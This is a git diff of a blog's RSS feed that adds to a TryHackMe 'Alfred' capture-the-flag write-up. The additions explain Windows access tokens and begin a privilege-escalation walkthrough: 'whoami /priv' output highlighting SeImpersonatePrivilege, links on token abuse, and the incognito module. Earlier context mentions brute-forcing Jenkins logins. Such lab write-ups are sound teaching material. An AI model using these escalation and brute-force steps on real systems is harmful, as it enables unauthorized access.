@@ -5,13 +5,13 @@
     <description>Burak Baris</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 28 Dec 2021 21:52:31 +0000</pubDate>
-    <lastBuildDate>Tue, 28 Dec 2021 21:52:31 +0000</lastBuildDate>
+    <pubDate>Thu, 30 Dec 2021 14:35:26 +0000</pubDate>
+    <lastBuildDate>Thu, 30 Dec 2021 14:35:26 +0000</lastBuildDate>
     <generator>Jekyll v4.2.1</generator>
     
       <item>
         <title>Tryhackme Alfred CTF Writeup</title>
-        <description>&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+        <description>&lt;h1 id=&quot;enumeration&quot;&gt;ENUMERATION&lt;/h1&gt;
 
 &lt;p&gt;Run Network Mapper (&lt;strong&gt;nmap&lt;/strong&gt;) on Alfred machine to discover opened ports and services.&lt;/p&gt;
 
@@ -94,7 +94,7 @@ If you google it, you will see the default login credentials for Jenkins is &lt;
 However, the system administrator could have changed the password to a different one. In that case default credentials
 would be useless. So we will brute force the credentials for best practice.&lt;br /&gt;&lt;/p&gt;
 
-&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;h1 id=&quot;exploitation&quot;&gt;EXPLOITATION&lt;/h1&gt;
 
 &lt;p&gt;In order to create a continuous HTTP request, we have to know how the HTTP request looks.
 Launch the &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-burp-suite/&quot;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt; to examine the HTTP POST request sent 
@@ -205,14 +205,192 @@ To get user flag, run:&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;kr&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Bruce\Desktop\user.txt&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;h1 id=&quot;privilege-escelation&quot;&gt;Privilege Escelation&lt;/h1&gt;
-&lt;p&gt;To be continued…&lt;/p&gt;
+&lt;h1 id=&quot;windows-tokens&quot;&gt;WINDOWS TOKENS&lt;/h1&gt;
+&lt;p&gt;This machine focuses on the Windows access tokens and escalate privileges with them.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-an-access-token-&quot;&gt;What is an access token ?&lt;/h2&gt;
+
+&lt;p&gt;An access token consists of:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Privileges&lt;/li&gt;
+  &lt;li&gt;Group SIDs(security identifier)&lt;/li&gt;
+  &lt;li&gt;User SIDs
+amongst other things.
+&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens&quot;&gt;&lt;strong&gt;Much more detailed information here.&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;An &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly&quot;&gt;access token&lt;/a&gt; contains the security 
+information for a logon session. The system creates an access token when a user logs on, and every process 
+executed on behalf of the user has a copy of the token. The token identifies the user, the user’s groups, 
+and the user’s privileges. The system uses the token to control access to securable objects and to control 
+the ability of the user to perform various system-related operations on the local computer. 
+There are two kinds of access token, &lt;strong&gt;primary&lt;/strong&gt; and &lt;strong&gt;impersonation&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;There are two types access tokens, according to &lt;a href=&quot;https://docs.microsoft.com/en-us/&quot;&gt;&lt;strong&gt;Windows Docs&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly&quot;&gt;Primary tokens&lt;/a&gt;: An access token that is typically created 
+only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secgloss/i-gly&quot;&gt;Impersonation tokens&lt;/a&gt;: An access token that has been created 
+to capture the security information of a client process, allowing a server to “impersonate” the client 
+process in security operations. It becomes convenient when you are the local admin on a system and want to
+impersonate another logged on client, e.g. a domain admin.
+&lt;br /&gt;&lt;br /&gt;There are four levels for impersonation token:
+    &lt;ul&gt;
+      &lt;li&gt;&lt;strong&gt;SecurityAnonymous&lt;/strong&gt;: current user/account/client cannot impersonate another user/account/client.&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;SecurityIdentification&lt;/strong&gt;: current user/account/client can get the privileges and identity of a user, but cannot impersonate the user.&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;SecurityImpersonation&lt;/strong&gt;: current user/account/client can impersonate user’s security context on the local system.&lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;SecurityDelegation&lt;/strong&gt;: current user/account/client can impersonate user’s security context on a remote system.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The security context is a data structure that stores clients’ security information.&lt;/p&gt;
+
+&lt;h3 id=&quot;diffrence-between-proceesses-hierarchy-in-unix-and-windows&quot;&gt;Diffrence between proceesses hierarchy in UNIX and Windows&lt;/h3&gt;
+&lt;h3 id=&quot;unix&quot;&gt;unix&lt;/h3&gt;
+&lt;p&gt;In UNIX like operating systems, there is the child-parent process hierarchy. Whenever a process
+creates a new process, the creating process becomes the parent while created process becomes the child. And the child process
+inherits all the permissions from its’ parent. If the parent dies, the child becomes an &lt;a href=&quot;https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/&quot;&gt;orphan or zombie process&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;windows&quot;&gt;windows&lt;/h3&gt;
+
+&lt;p&gt;The parent-child relationship does not exist for the Windows environment. 
+However, I will refer to them as parent-child to facilitate the explanation.
+Whenever a new process is initiated, the parent process receives an ID and the process handler of the child process.
+It simulates the hierarchial relationship if the application requires it to do so. The child process copies the access 
+token of its’ parent which is created by &lt;strong&gt;LSASS.exe&lt;/strong&gt; on logon. However, windows treats all processes as belonging to the 
+same generation.&lt;/p&gt;
+
+&lt;h4 id=&quot;what-is-the-lsassexe-&quot;&gt;what is the LSASS.exe ?&lt;/h4&gt;
+&lt;p&gt;LSASS.exe, &lt;strong&gt;Local Security Authority Process&lt;/strong&gt;, is responsible for authenticating accounts
+in the WinLogon service. The process is operated by using authentication packages such as the default msgina.dll. When the user
+authenticates, lsass.exe generates a &lt;strong&gt;user access token&lt;/strong&gt;, which is then used to launch the initial shell. &lt;strong&gt;Other processes that
+the account initiates inherit from this token&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;commons&quot;&gt;commons&lt;/h3&gt;
+&lt;p&gt;Both Windows and UNIX processes inherit the security settings of the creating process by default.
+Signals, Exceptions, and Events.&lt;/p&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
+
+&lt;p&gt;After gaining the initial access to the target machine, the first step will be to check the account’s permissions on the system.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;Run: &lt;strong&gt;whoami /priv&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;C:\Program&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\Jenkins\workspace\project&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/priv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRIVILEGES&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----------------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Privilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                               &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;State&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===============================&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeIncreaseQuotaPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Adjust&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;quotas&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSecurityPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Manage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auditing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeTakeOwnershipPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Take&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ownership&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;other&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeLoadDriverPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Load&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unload&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;drivers&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSystemProfilePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Profile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;performance&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSystemtimePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Change&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeProfileSingleProcessPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Profile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;single&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeIncreaseBasePriorityPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Increase&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scheduling&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeCreatePagefilePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pagefile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeBackupPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Back&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;up&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directories&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeRestorePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Restore&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directories&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeShutdownPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Shut&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;down&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeDebugPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Debug&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;programs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSystemEnvironmentPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Modify&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;firmware&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeChangeNotifyPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;traverse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;checking&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeRemoteShutdownPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeUndockPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Remove&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;docking&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;station&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeManageVolumePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Perform&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;volume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;maintenance&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Impersonate&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;after&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;authentication&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeCreateGlobalPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                     &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeIncreaseWorkingSetPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Increase&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;working&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeTimeZonePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Change&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeCreateSymbolicLinkPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;symbolic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                     &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Those are the privileges of the current user which are inherited from a group or given to the account when created. 
+However, only three of them stated as &lt;em&gt;Enabled&lt;/em&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;https://github.com/gtworek/Priv2Admin&quot;&gt;Here&lt;/a&gt; is the full list of exploitable privileges.
+&lt;br /&gt;And &lt;a href=&quot;https://www.exploit-db.com/papers/42556&quot;&gt;here&lt;/a&gt; is the detailed documentation of abusing token privileges.
+&lt;br /&gt;Also a great video resource &lt;a href=&quot;https://www.youtube.com/watch?v=QRpfvmMbDMg&quot;&gt;here&lt;/a&gt; about token handling vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;We will need a module called &lt;a href=&quot;https://labs.f-secure.com/archive/incognito-v2-0-released/&quot;&gt;incognito&lt;/a&gt;.
